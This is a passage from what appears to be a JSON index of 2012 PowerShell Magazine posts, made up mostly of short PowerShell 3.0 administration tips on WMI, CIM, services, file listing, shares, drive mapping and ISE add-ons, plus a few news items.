the preview pane is open and you don’t see the script content, turn preview off and then on (you can use the ALT+P shortcut twice) to force Explorer to read the Registry value. Now you should see its content displayed:\nTo enable preview for multiple extensions:\nPS\u0026gt; Get-Item Registry::HKEY_CLASSES_ROOT\\* -Include .ps1,.psm1,.psd1 | Set-ItemProperty -Name PerceivedType -Value text   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/09/10/pstip-preview-powershell-script-files-in-windows-explorer-preview-pane/","tags":["Tips and Tricks"],"title":"#PSTip Preview PowerShell script files in Windows Explorer Preview Pane"},{"categories":["Tips and Tricks"],"contents":"Let’s presume you have a text file that contains the following two lines:\nMy current user profile is $env:USERPROFILE.\nThe system folder is $env:windir\\System32.\nIf you use the Get-Content cmdlet to output the content, the environment variables will not be expanded:\nPS\u0026gt; Get-Content .\\test.txt My current user profile is $env:USERPROFILE. The system folder is $env:windir\\System32.  The solution is to use the ExpandString() method as in:\nPS\u0026gt; Get-Content .\\test.txt | ForEach-Object { $ExecutionContext.InvokeCommand.ExpandString($_) } My current user profile is C:\\Users\\Aleksandar. The system folder is C:\\Windows\\System32.   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/09/07/pstip-how-to-expand-environment-variable-contained-in-a-text-file/","tags":["Tips and Tricks"],"title":"#PSTip How to expand environment variable contained in a text file"},{"categories":["Tips and Tricks"],"contents":"Not all WMI class properties can be modified. Many of these properties are read-only. Take a look at the properties and Win32_ComputerSystem, for example.\nNow, how do we retrieve properties of a WMI class that are read/write capable? This can be achieved by looking at the property qualifiers. Let us see how:\n$class = [wmiclass]'Win32_ComputerSystem' $class.Properties | ForEach-Object { foreach ($qualifier in $_.Qualifiers) { if ($qualifier.Name -eq \"Write\") { $_.Name } } }  Now, this can be easily extended to verify and list other qualifying properties such as data type, etc.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/09/06/pstip-get-all-writeable-properties-of-a-wmi-class/","tags":["Tips and Tricks"],"title":"#PSTip Get all writeable properties of a WMI class"},{"categories":["Tips and Tricks"],"contents":"Whenever we use WMI cmdlets to query either local or remote machines, we need to keep the following points in mind:\nDon’t ever pipe the WMI objects to Where-Object cmdlet to filter the WMI output unless there is a need to do so. Consider this example:\nGet-WmiObject -Class Win32_OperatingSystem -ComputerName $servername | Where-Object { $_.BuildNumber -eq \"7601\" }  The above command forces WMI to retrieve the objects to the local session and pass them on to Where-Object for filtering. This takes longer depending on the number of objects to retrieve or the size of the objects. This is where the –Filter parameter of the Get-WmiObject comes into play.\nGet-WmiObject -Class Win32_OperatingSystem -ComputerName $servername -Filter \"BuildNumber=7601\"  In this example using –Filter parameter, the filtering happens on the remote system and results in faster execution of the command.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/09/05/pstip-optimizing-wmi-object-retrieval/","tags":["Tips and Tricks"],"title":"#PSTip Optimizing WMI object retrieval"},{"categories":["News"],"contents":"Windows Management Framework 3.0 was released yesterday. It includes updated management functionality for Windows 7 Service Pack 1, Windows Server 2008 R2 SP1, and Windows Server 2008 Service Pack 2 (Windows Vista, Windows XP, and Windows Server 2003 are not supported). Windows Management Framework 3.0 contains Windows PowerShell 3.0 and the new versions of WMI and WinRM.\nWMF 3.0 requires Microsoft .NET Framework 4.0, you can download it at: http://go.microsoft.com/fwlink/?LinkID=212547\nA link to the download page is also available in the Downloads sidebar, on the right hand side menu of the magazine’s homepage.\nYou can install WMF 3.0 over PowerShell 2.0. In case you have a pre-release version of PowerShell 3.0 installed already, you need to remove it before the installation of WMF3.0.\nNote: WMF 3.0 is a part of Windows 8 and Windows Server 2012 operating systems.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/09/05/powershell-3-0-is-available-for-downlevel-systems/","tags":["News"],"title":"PowerShell 3.0 is available for downlevel systems"},{"categories":["Columns","Tips and Tricks"],"contents":"In the previous tip we showed you how to modify WMI object properties using Get-WmiObject cmdlet and the Put method. Today I want to show you another streamlined way to do the same using the Set-WmiInstance cmdlet.\nThe Set-WmiInstance cmdlet creates or updates an instance of an existing WMI class and writes the updates back to the WMI repository. So, if we wanted to modify the volume name of drive D:\nGet-WmiObject -Class Win32_LogicalDisk -Filter \"DeviceID='D:'\" | Set-WmiInstance -Arguments @{VolumeName = \"Data\"}  The Arguments parameter accepts a hashtable of name-value pair, property names, and the new values we want to set. To update multiple properties, delimit them with a semicolon @{Property1=’Value1′; Property=’Value2′}\nNote: You must have administrative rights to update the properties and the console must be run elevated.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/09/04/pstip-another-way-to-modify-wmi-instance-properties/","tags":["Tips and Tricks"],"title":"#PSTip Another way to modify WMI instance properties"},{"categories":["Tips and Tricks"],"contents":"Get-WmiObject and object modification! Sounds contradictory? Not really. That is the beauty of PowerShell and its object-based nature. Let us see an example to understand this.\n$vol = Get-WmiObject -Class Win32_LogicalDisk -Filter \"DeviceID='E:'\" $vol.VolumeName = \"Memory Card\"  Now, setting the VolumeName to “Memory Card” isn’t enough.\n$vol.Put()  The Put() method ensures that the changes made to the object are written back. Make a note that you must have administrative rights to update some of the WMI object properties.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/09/03/pstip-modifying-wmi-object-properties-using-get-wmiobject-cmdlet/","tags":["Tips and Tricks"],"title":"#PSTip Modifying WMI Object properties using Get-WmiObject cmdlet"},{"categories":["News"],"contents":"PowerShell.org is a new community site, led by PowerShell MVPs Don Jones and Kirk Munro, designed to be a general-purpose gathering place and portal for Windows PowerShell, providing discussion forums, technical articles, blog posts, and other resources.\nHere is the announcement made by Don Jones on PowerShell.org http://powershell.org/wp/2012/07/29/the-new-community\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/09/01/new-powershell-community-website/","tags":["News"],"title":"New PowerShell community website"},{"categories":["Tips and Tricks"],"contents":"In the previous tip, we’ve showed you how to get a function definition using cool and unusual technique. Can we use the Get-Command cmdlet to get the same result? Let’s look at properties of a FunctionInfo object returned by Get-Command prompt command:\nPS\u0026gt; Get-Command prompt | Get-Member TypeName: System.Management.Automation.FunctionInfo Name MemberType Definition ---- ---------- ---------- Equals Method bool Equals(System.Object obj) GetHashCode Method int GetHashCode() GetType Method type GetType() ResolveParameter Method System.Management.Automation.ParameterMetadata ResolveParameter(string name) ToString Method string ToString() PSDrive NoteProperty System.Management.Automation.PSDriveInfo PSDrive=Function PSIsContainer NoteProperty System.Boolean PSIsContainer=False PSPath NoteProperty System.String PSPath=Microsoft.PowerShell.Core\\Function::prompt PSProvider NoteProperty System.Management.Automation.ProviderInfo PSProvider=Microsoft.PowerShell.Core\\Fu... Capability Property System.Management.Automation.CommandCapability Capability {get;} CmdletBinding Property bool CmdletBinding {get;} CommandType Property System.Management.Automation.CommandTypes CommandType {get;} Data Property System.Object Data {get;set;} DefaultParameterSet Property string DefaultParameterSet {get;} Definition Property string Definition {get;} Description Property string Description {get;set;} HelpFile Property string HelpFile {get;} Module Property psmoduleinfo Module {get;} ... Bingo! The commands in the function are stored as a script block in the Definition property of the function.\nPS\u0026gt; Get-Command prompt | Select-Object -Property Definition Definition ---------- \u0026quot;PS $($executionContext.SessionState.Path.CurrentLocation)$('\u0026amp;gt;' * ($nestedPromptLevel + 1)) \u0026quot;... But wait, that’s not the whole definition! Luckily, the Select-Object has the ExpandProperty parameter. As its name implies, its purpose is to expand the specified property. For example, if the specified property is an array, each value of the array is included in the output. If the property contains an object, the properties of that object are displayed in the output.\nPS\u0026gt; Get-Command prompt | Select-Object -ExpandProperty Definition \"PS $($executionContext.SessionState.Path.CurrentLocation)$('\u0026gt;' * ($nestedPromptLevel + 1)) \" # .Link # http://go.microsoft.com/fwlink/?LinkID=225750 # .ExternalHelp System.Management.Automation.dll-help.xml  Some people are fond of pithier syntax using dot notation:\nPS\u0026gt; (Get-Command prompt).definition  Note: If you prefer to work with the Function: drive, the following command will return the same object as Get-Command prompt:\nPS\u0026gt; Get-ChildItem function:prompt  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/08/31/pstip-another-way-to-get-a-function-definiton/","tags":["Tips and Tricks"],"title":"#PSTip Another way to get a function definiton"},{"categories":["Tips and Tricks"],"contents":"Getting the content of an object is usually done with the Get-Content cmdlet. For example, getting the content of the Windows hosts file:\nGet-Content C:\\Windows\\System32\\drivers\\etc\\hosts  Did you know that Get-Content has a shortcut syntax to do the same?\nPS\u0026gt; ${C:\\Windows\\System32\\drivers\\etc\\hosts}  Here’s how you can get a definition of a function:\nPS\u0026gt; ${function:prompt}  Note: Keep in mind that the value in the braces must be a literal, no variables are allowed. This will not work:\nPS\u0026gt; ${$env:WINDIR\\System32\\drivers\\etc\\hosts}   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/08/30/pstip-getting-the-content-of-an-object/","tags":["Tips and Tricks"],"title":"#PSTip Getting the content of an object"},{"categories":["News"],"contents":"PowerShell MVP Yusuf Ozturk released a project he’s been working on lately – PoSHStats v1.1. PoSHStats is the first free and open source reporting tool of Hyper-V resource metering. PoSHStats runs on your Hyper-V server to get detailed statistics like CPU, memory, disk, and bandwidth usage of your virtual machines. It’s possible to get daily, weekly, and monthly usage statistics of virtual machines. It also gets hourly performance data of your Hyper-V host to monitor your virtualization environment.\nInstallation of PoSHStats is very easy and doesn’t require additional software. Give it a try!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/08/30/poshstats-for-hyper-v-3-0/","tags":["News"],"title":"PoSHStats for Hyper-V 3.0"},{"categories":["Tips and Tricks"],"contents":"PowerShell 3.0 introduced important changes to the Update-TypeData cmdlet which includes specifying the dynamic type data. Using these new features of Update-TypeData cmdlet, we can add extended types without using the types.ps1xml files.\nFor example, let us say that we want to add the age of a file as a property to the output of Get-ChildItem cmdlet.\nThis can be achieved using:\nUpdate-TypeData -TypeName System.IO.FileInfo -MemberName FileAge -MemberType ScriptProperty -Value { ((get-date) - ($this.creationtime)).days }  What we are doing in the above command is very straightforward. For every System.IO.FileInfo type of object, we instruct PowerShell to add a ScriptProperty called FileAge and assign the days since the file was created as its value.\nIn PowerShell 2.0, this would require creating a types.ps1xml file and then using Update-TypeData cmdlet. PowerShell 3.0 made it very simple and efficient to use. Make a note, however, the Update-TypeData does not update the format information for the specified types. It only applies to the current session and won’t be available once you close the session.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/08/29/pstip-adding-extended-types-the-powershell-3-0-way/","tags":["Tips and Tricks"],"title":"#PSTip Adding extended types – the PowerShell 3.0 way!"},{"categories":["Tips and Tricks"],"contents":"Consider the following PowerShell 2.0 command:\nGet-Service -Name wuauserv -ComputerName Server1 | Stop-Service  What do you think is happening here? You get the Windows Update service from Server1 and stop it, right? Wrong!\nThere’s a bug in PowerShell 2.0 and what actually happens is that Stop-Service stops the service on the local computer.\nThis has ben fixed in v3 but there’s a trick you can use to make it work in v2, pass the service instance to the InputObject Parameter:\nPS\u0026gt; $svc = Get-Service -Name wuauserv -ComputerName Server1 PS\u0026gt; Stop-Service -InputObject $svc   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/08/28/pstip-starting-and-stopping-services-on-remote-computers/","tags":["Tips and Tricks"],"title":"#PSTip Starting and Stopping services on remote computers"},{"categories":["Tips and Tricks"],"contents":"I’m kind of guy who loves tiny little tricks. Tricks in PowerShell are almost like Easter eggs in the games of old times, very rewarding when you find them – but in PowerShell besides pure joy of being able to find something cool, you can move it to the next level, add it to your tool belt and use it every single day.\nI’ve started using PowerShell 3 since first public build and tried to use it every single day: play with it, test things, break things, and also look for new tricks that were not there in v2. There are many cool additions known very well and mentioned by everybody who used this version for a while – some of them are focused on robust scripts, some on interactive use. All in all – we can be more productive with very little code on our side in v3. PowerShell team has put a lot of effort to give us new language features, new usability cmdlets, and significantly increased PowerShell coverage.\nLet’s start with interactive work. You probably heard about simplified Where-Object and ForEach-Object syntax. Just in case you have not: this is ability to use Where-Object and ForEach-Object without a script block. You can obviously complain that it’s inconsistent, but if you are in shell and need to get data quickly – consistency is not your main focus. My first thought was: great for shell, bad for scripts – same as aliases. That said – I’ve been seeing people using it a lot, so why do I mention them? Because old habits die hard and even though new syntax gives some additional benefits, most of people just remove braces and $_. What do I mean? Let’s start with new Where-Object.\nFirst of all, what looks like comparison operators are in fact parameters for your command. What it allows you to do is shortening comparer same way you can do that with other parameters. It won’t help you much with stuff like –eq or –in, but when we are talking about –match (-m) than you are really saving some time.\nAnother thing is the fact that arguments that are strings do not require quotes in 90% of scenarios. If you don’t have the characters that would trigger some parsing behaviour (like comma, semicolon, brackets) you can put the arguments without any quotes:\nls | ? Name -m unt  Remember – this is for my eyes only. Or I should probably say – for my fingers. So even though it’s brief enough to become cryptic, in interactive work it should not matter. New ForEach-Object syntax can be used for two things: to quickly expand one of the properties (as an alternative you could use select –ExpandProperty since v2), or to call method on each element. Obviously, some methods do not have arguments, so regardless of the member type we end up with something as brief as:\ngps notepad | % kill  But that works just fine (or even better, in my opinion) once we start using methods that actually take some arguments. It’s getting crazy cool and sometimes make you want to use ForEach-Object (or its alias %) in situations, where you would avoid it in v2. Let’s look at good example of such method:\ngwmi -List win32_share | % create $PSHOME POSH 0 gwmi win32_share | ? name -m po  It’s almost like we could now call .NET methods the same way we call PowerShell functions, and I think this is very great thing to have. Behind the scenes it uses ValueFromRemainingArguments, but that’s again – neat trick to save some time and typing. 😉\nSecond trick or rather trick-combo is something anybody can use to make his objects shine with very brief and pretty awesome syntax. First part of this combo is syntax for new PSCustomObjects. Let’s say you are merging different information about single computer that you connect to, and need to create custom object as the end result. In v2 creating new objects is usually done using New-Object –Property (if order of parameters makes no difference) or Select-Object/Add-Member (if you actually care about the order). In v3 we have syntax that will share brevity of former, and ordered output of latter. Let’s build a function:\nfunction Get-CompInfo { param ( [Parameter( ValueFromPipeline )] [string]$ComputerName ) process { $CIMSession = New-CimSession @PSBoundParameters $PSDefaultParameterValues = @{ 'Get-CimInstance:CimSession' = $CIMSession } $CompInfo = Get-CimInstance -ClassName Win32_ComputerSystem $OSInfo = Get-CimInstance -ClassName Win32_OperatingSystem [PSCustomObject]@{ Name = $CompInfo.Name User = $CompInfo.UserName Domain = $CompInfo.Domain Model = $CompInfo.Model OS = $OSInfo.Caption SP = $OSInfo.CSDVersion } } }  As you can see it’s almost like it used be, only better… So we have first “hit”. Well, we actually got two – I smuggled something I would call “implicit splatting” – using $PSDefaultParameterValues to pass value for one of parameters to several commands without actually passing it at all. What’s next? A new syntax around Add-Member. Not only you can easily add few NoteProperties with it using simple hash table (that again – can be [ordered]), but you also can easily define custom type! Let’s change our function a bit to include both syntax elements:\nfunction Get-CompInfo { param ( [Parameter( ValueFromPipeline )] [string]$ComputerName ) process { $CIMSession = New-CimSession @PSBoundParameters $PSDefaultParameterValues = @{ 'Get-CimInstance:CimSession' = $CIMSession } $CompInfo = Get-CimInstance -ClassName Win32_ComputerSystem $OSInfo = Get-CimInstance -ClassName Win32_OperatingSystem [PSCustomObject]@{ Name = $CompInfo.Name User = $CompInfo.UserName Domain = $CompInfo.Domain Model = $CompInfo.Model OS = $OSInfo.Caption SP = $OSInfo.CSDVersion } | Add-Member -TypeName My.Type -NotePropertyMembers ([ordered]@{ Created = Get-Date Author = $env:USERNAME }) -PassThru } }  What if we would like to change the way my objects is shown quickly? In v3 we can again define default display PropertySet to avoid need for ps1xml format file to limit properties that are shown by default. Once we define this set in begin block, we can add it to our object before they leave our function:\nfunction Get-CompInfo { param ( [Parameter( ValueFromPipeline )] [string]$ComputerName ) begin { $StandardMembers = New-Object System.Management.Automation.PSPropertySet -ArgumentList DefaultDisplayPropertySet, ([string[]]('Name','User','OS','SP')) $MyTypeData = @{ MemberType = 'MemberSet' Name = 'PSStandardMembers' Value = $StandardMembers TypeName = 'MyType' } } process { $CIMSession = New-CimSession @PSBoundParameters $PSDefaultParameterValues = @{ 'Get-CimInstance:CimSession' = $CIMSession } $CompInfo = Get-CimInstance -ClassName Win32_ComputerSystem $OSInfo = Get-CimInstance -ClassName Win32_OperatingSystem [PSCustomObject]@{ Name = $CompInfo.Name User = $CompInfo.UserName Domain = $CompInfo.Domain Model = $CompInfo.Model OS = $OSInfo.Caption SP = $OSInfo.CSDVersion } | Add-Member -TypeName My.Type -NotePropertyMembers ([ordered]@{ Created = Get-Date Author = $env:USERNAME }) -PassThru | Add-Member @MyTypeData -PassThru } }  And last but not least – something that will be useful both for custom, user-defined types and for modifying behaviour of existing types – new syntax for Update-TypeData:\nUpdate-TypeData -MemberType ScriptMethod -Value { @\" Computer {0}, used by {1}, running {2} with {3}. Inventory created: {4:G} by {5}. \"@ -f @( $this.Name, $this.User, $this.OS, $this.SP, $this.Created, $this.Author) } -MemberName Summary -TypeName My.Type  See? Now our need to use ps1xml files got limited to some really advanced situations only, and logic and readability of functions/ scripts got way better. This finalizes this tricks-combo. J\nThe last trick I would like to share is something that might be useful to people who would like to ignore existence of WQL. The problem with this language is that unlike most of PowerShell commands – it will require more SQL-like syntax for wildcards. But wouldn’t it be nice to have something that would translate them for us? And now, in v3, we actually got tool to do that:\n([Management.Automation.WildcardPattern]@' Some*g To Trans?ate - With _escaping_ %) '@).ToWql()  All you need to do is create the logic for your function that would translate any pattern specified by user (using normal wildcards) to pattern. Such logic could look like this:\n$query = 'Name -like \"*foo*\" -AND Bla -like \"*bar*\"' $tokens = [Management.Automation.PSParser]::Tokenize($query, [ref]$null) $FilterElements = @() foreach ($token in $tokens) { switch ($token.Type) { CommandParameter { # stuff like: -like and -and... replace with same w/o '-' $FilterElements += $token.Content -replace '^-' } String { # assume this is pattern we are after... Need to keep quotes, too. $FilterElements += \"'$( ([Management.Automation.WildcardPattern]$Token.Content).ToWql() )'\" } Default { # no changes needed... $FilterElements += $token.Content } } } $FilterElements -join \" \"  And that’s third trick I would like to share. There are a lot more to come in next version of Windows PowerShell, good luck with finding them. And don’t forget to share them, once you find one!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/08/28/bartek-bielawskis-favorite-powershell-tips-and-tricks/","tags":["Tips and Tricks"],"title":"Bartek Bielawski’s Favorite PowerShell Tips and Tricks"},{"categories":["Tips and Tricks"],"contents":"The traditional or PowerShell 2.0 way of retrieving only files is:\nGet-ChildItem $env:windir | Where-Object { ! $_.PSIsContainer }  The new parameter -File of the Get-ChildItem cmdlet simplifies the filtering:\nGet-ChildItem $env:windir -File  Another way to achieve this in PowerShell 3.0 is another new parameter of Get-ChildItem cmdlet, –Attributes. It can be used to not only make this process easier but also speed up the whole process when executing against a large folder! This parameter takes the file system attributes as arguments and it also lets a way to combine with logical operators to achieve what we want. Let us see how:\nGet-ChildItem $env:windir -Recurse -Attributes !D  In the above command, ‘!D’ specifies that we want to retrieve only items that are not directories! Simple and fast. Isn’t it?\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/08/27/pstip-how-to-get-only-files-the-powershell-3-0-way/","tags":["Tips and Tricks"],"title":"#PSTip How to get only files – the PowerShell 3.0 way!"},{"categories":["Tips and Tricks"],"contents":"PowerShell equivalent of the ping.exe utility is the Test-Connection cmdlet. One of the hidden and less known capabilities of Test-Connection is the abitlity to ping a computer using another computer as the source. For example, when troubleshooting, you often need to verify connectivity between two computers using a quick ping test. The common practice is to make a remote desktop connection to ComputerA, open cmd, then ping ComputerB.\nWith the Test-Connection cmdlet you are no longer required to do so. You can use the cmdlet to initiate a ping check that uses ComputerA as the source computer and ComputerB as the destination.\nPS\u0026gt; Test-Connection -Source ComputerA -ComputerName ComputerB  Note: WMI is the underlying mechanism that Test-Connection is built upon and this method requires the caller to have administrator’s rights on the source computer and the source computer’s OS version must be Windows XP and above.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/08/26/pstip-a-hidden-gem-of-the-test-connection-cmdlet/","tags":["Tips and Tricks"],"title":"#PSTip A hidden gem of the Test-Connection cmdlet"},{"categories":["Columns","Tips and Tricks"],"contents":"In Windows PowerShell 2.0, retrieving WMI associations and references required complex WMI queries. For example, if you wanted to get the IP address bound to a particular network adapter using WMI associations you would run:\n$query = \"ASSOCIATORS OF {Win32_NetworkAdapter.DeviceID=12} WHERE ResultClass=Win32_NetworkAdapterConfiguration\" Get-WmiObject -Query $query  This certainly requires a good understanding of WMI Query Language and how to use different keywords in WQL.\nEnter Windows PowerShell 3.0!\nPowerShell 3.0 includes CIM cmdlets and the above example can be easily implemented using the new Get-CimAssociatedInstance cmdlet.\nLet us see how:\n$net = Get-CimInstance -ClassName Win32_NetworkAdapter -Filter \"DeviceID=12\" Get-CimAssociatedInstance -InputObject $net -ResultClassName Win32_NetworkAdapterConfiguration  That is it. Simple!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/08/24/pstip-getting-wmi-associated-classes-in-powershell-3-0/","tags":["Tips and Tricks"],"title":"#PSTip Getting WMI associated classes in PowerShell 3.0"},{"categories":["Columns","Tips and Tricks"],"contents":"The ConvertTo-Html cmdlet converts Microsoft .NET Framework objects into HTML that can be displayed in a Web browser. In the following example we pick up a few properties of process objects with name that contains the word ‘host’, sort the output by the ‘Handles’ property, convert it to HTML, and save it as HTML file in the user’s TEMP folder. At the end we open the HTML file in the default browser.\nGet-Process -Name *host* | Select-Object -Property Name,Id,Handles | Sort-Object -Property Handles -Descending | ConvertTo-Html -Title \"PowerShell Rocks!\" -Body \"\u0026lt;h1\u0026gt;Info about *host* processes\u0026lt;/h1\u0026gt;\" | Out-File -FilePath $env:TEMP\\processes.html  Invoke-Item -Path $env:TEMP\\processes.html   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/08/23/pstip-how-to-convert-net-framework-objects-into-html/","tags":["Tips and Tricks"],"title":"#PSTip How to convert .NET Framework objects into HTML"},{"categories":["Columns","Tips and Tricks"],"contents":"When we use the Get-Module -ListAvailable command to list installed modules, we get a list of modules from two default module locations: one for the system and one for the current user.\nBy default, the current user modules are located under the current user’s Documents (MyDocuments) folder and system modules reside under the PowerShell installation directory. To view the default module locations, type:\nPS\u0026gt; $env:PSModulePath  The value is hard to read and is displayed in one long line delimited by a semi colon. To display the paths, one on its own line, type:\nPS\u0026gt; $env:PSModulePath -split ';'  Each module info object returned by Get-Module has a Path property. We can use the Path to programmatically determine if a module is a user module or a system module. For system modules, we can check if the module path starts with the path of Windows PowerShell installation directory:\nPS\u0026gt; Get-Module -ListAvailable | Where-Object {$_.Path -like \"$PSHOME*\" }  To produce a list of user modules, we can simply negate the filter using the -NotLike operator:\nPS\u0026gt; Get-Module -ListAvailable | Where-Object {$_.Path -notlike \"$PSHOME*\" }   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/08/22/pstip-getting-system-modules-only/","tags":["Tips and Tricks"],"title":"#PSTip Getting system modules only"},{"categories":["Tips and Tricks"],"contents":"Quite easy, with a one-liner. Windows Server 2012 provides Windows PowerShell cmdlets and WMI objects to manage SMB file servers and SMB file shares. The SMB cmdlets are packaged into two modules called SmbShare and SmbWitness. These modules are automatically loaded (thanks to new module auto-loading feature) whenever you refer to any of the contained cmdlets. No upfront configuration is required. (Note: Check the output of the Get-Module command before and after you run the following one-liner to see that SmbShare module is loaded behind the scenes.)\nNew-SmbShare –Name MyShare –Path C:\\Test –Description 'Test Shared Folder' –FullAccess Administrator –ReadAccess Everyone  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/08/21/pstip-how-to-create-a-share-in-windows-server-2012/","tags":["Tips and Tricks"],"title":"#PSTip How to create a share in Windows Server 2012"},{"categories":["Tips and Tricks"],"contents":"Windows PowerShell Integrated Scripting Environment (ISE) is my first preferred script editor. Especially, with all the new cool features introduced in version 3.0. I love working with ISE and try to make my life easier when using the same. Fortunately, ISE exposes the scripting object model — $psISE. This object model makes it easy to extend ISE functionality and this tip is about one of those aspects.\nVery often, I end up selecting and copying the current line from ISE script editor to a console prompt or into a document or email I am working on. If you have looked at ISE menu or keyboard shortcuts closely, there is no keyboard shortcut or ISE menu item to select current line.\nThis is where $psISE kicks in.\nIn the ISE scripting object model, the current line is represented by the property called CaretLine. This can be accessed using:\n$psISE.CurrentFile.Editor.CaretLine  Now, using the same object model, we can select the current line using :\n$psISE.CurrentFile.Editor.SelectCaretLine()  Now, coming to the fun part of adding this as a menu item — once again using $psISE scripting object model:\n$ScriptBlock = { $psISE.CurrentFile.Editor.SelectCaretLine() } $psISE.CurrentPowerShellTab.AddOnsMenu.Submenus.Add(\u0026quot;Select _Current Line\u0026quot;, $ScriptBlock, \u0026quot;Ctrl+Alt+C\u0026quot;) This is it. Once you execute the above code snippet and press Ctrl+Alt+C, the current line in the script is selected. Now, extending this to copy the current line isn’t tough. Let us see that as well.\n$ScriptBlock = { $psISE.CurrentFile.Editor.SelectCaretLine() $psISE.CurrentFile.Editor.SelectedText | clip } $psISE.CurrentPowerShellTab.AddOnsMenu.Submenus.Add(\u0026quot;Copy _Current Line\u0026quot;, $ScriptBlock, \u0026quot;Alt+C\u0026quot;) Simple! Isn’t it?\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/08/20/pstip-selectingcopying-the-current-line-in-powershell-ise/","tags":["Tips and Tricks"],"title":"#PSTip Selecting/copying the current line in PowerShell ISE"},{"categories":["News"],"contents":"Rolf Masuch [MSFT], a former PowerShell MVP, has created the PowerShell Help app for Windows Phone. The app gives you a searchable list of the PowerShell v2 cmdlets. When you select a cmdlet, you have an option to get the parameters, the examples, or the link to online help topic. You can send all gathered information by email. Additionally, you can get all of the about_* topics, the PowerShell SDK, and the list of bloggers. All is gathered from a webservice, therefore the data connection is needed.\nThe future version will support PowerShell v3 as well and help topics for other products, like SQL or System Center.\nWhen can you find this app useful?\n– If you are in front of a computer with no Internet connectivity (DMZ)\n– If someone asks you for PowerShell help when you are away from your computer, you can still send them a valuable example or a full help topic by mail from your phone\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/08/18/powershell-2-0-help-on-windows-phone/","tags":["News"],"title":"PowerShell 2.0 Help on Windows Phone"},{"categories":["Tips and Tricks"],"contents":"The Startup type information is not available when we use the Get-Service cmdlet. Luckily the Win32_Service WMI class has a StartMode property that we can use to create a nice server-side filter. If outer quotes are double quotes, you need to use single ones for values.\nGet-WmiObject -Class Win32_Service -Filter \"StartMode='Auto' AND State='Stopped'\"  You can add ComputerName parameter to easily query services on a remote computer:\nGet-WmiObject -Class Win32_Service -Filter \"StartMode='Auto' AND State='Stopped'\" –ComputerName Server01,Server02 –Credential (Get-Credential Administrator)  You cannot use the Credential parameter when you run the management operation against the local computer.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/08/17/pstip-how-to-get-non-running-automatic-services/","tags":["Tips and Tricks"],"title":"#PSTip How to get non-running automatic services"},{"categories":["Columns","Tips and Tricks"],"contents":"In the previous tip we showed you how to get the next available drive letter using the Get-AvailableDriveLetter function when we want to create a new mapped network drive.\nThe Get-AvailableDriveLetter function is one of the commands in the Storage module in Windows 8 and Server 2012.\nStarting with PowerShell 3.0, we can now map persistent drives using the enhanced New-PSDrive cmdlet. The following command uses the Get-AvailableDriveLetter function together with the New-PSDrive cmdlet and its -Persist parameter to map a persistent drive:\nPS\u0026gt; $letter = Get-AvailableDriveLetter -ReturnFirstLetterOnly PS\u0026gt; New-PSDrive -Name $letter -PSProvider FileSystem -Root \\\\Server01\\Share -Persist  To disconnect the drive:\nPS\u0026gt; Remove-PSDrive -Name $letter  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/08/16/pstip-persistent-file-system-drives/","tags":["Tips and Tricks"],"title":"#PSTip Persistent file system drives"},{"categories":["Columns","Tips and Tricks"],"contents":"Mapping drives is a routine task for IT pros—you choose a free drive letter, ranging from A-Z, and then use it to map a drive to a specific path. What if you need to do that in a script? How do you know which letter is available for the new drive?\nHere at the magazine we dedicated a [Brain Teaser to find an unused drive letter][1] but we want to tell you of another, new, built-in way to get that information.\nWindows 8 and Server 2012 ship with the Storage module which provides PowerShell cmdlets for end to end management of Windows storage. One of the module functions is Get-AvailableDriveLetter.\nUpdate (8/20/2012)\nIn Windows 8 RTM, Get-AvailableDriveLetter is not a part of the Storage module.\nHowever it will be included in a downloadable module at the TechNet Script Center in the near future.\nIn the meantime, you can put the code in your own Get-AvailableDriveLetter function.\nRunning the function without any parameters outputs all available drive letters:\nPS\u0026gt; Get-AvailableDriveLetter G H I ... X Y Z We can also ask for the first letter only:\nPS\u0026gt; Get-AvailableDriveLetter -ReturnFirstLetterOnly G  Finally, since this is a function, we can see how letters are retrieved by taking a look at the function definition:\nPS\u0026gt; Get-Command Get-AvailableDriveLetter | Select-Object –ExpandProperty Definition param( [parameter(Mandatory=$False)] [Switch] $ReturnFirstLetterOnly ) $volumeList = Get-Volume # Get all available drive letters, and store in a temporary variable. $UsedDriveLetters = @(Get-Volume | % { \u0026quot;$([char]$_.DriveLetter)\u0026quot;}) + @(Get-WmiObject -Class Win32_MappedLogicalDisk| %{$([char]$_.DeviceID.Trim(':'))}) $TempDriveLetters = @(Compare-Object -DifferenceObject $UsedDriveLetters -ReferenceObject $( 67..90 | 